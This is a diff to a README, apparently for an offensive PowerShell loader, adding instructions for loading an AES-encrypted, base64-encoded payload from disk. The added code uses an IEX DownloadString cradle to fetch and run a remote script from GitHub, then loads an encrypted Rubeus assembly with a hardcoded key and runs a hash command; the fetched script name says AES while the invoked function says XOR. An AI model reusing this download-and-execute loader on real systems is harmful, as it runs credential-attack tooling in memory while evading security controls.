@@ -264,3 +264,11 @@ $ldrcommand = "[" + $ep.reflectedtype.namespace + "." + $ep.reflectedtype.name +
 echo $ldrcommand
 Invoke-Expression $ldrcommand
 ```
+
+## [Update] Add a feature to load AES encrypted and base64 encoded payload from local path. This might be useful in some extreme situation.
+
+```
+IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssemblyAESLocal.ps1"));
+Invoke-LoadAssemblyXORLocal -AssemblyPath "C:\\Windows\\Tasks\\rubeus_aes.enc" -KeyString "Me0w_key_Me0w" -Command "hash /password:test"
+
+```
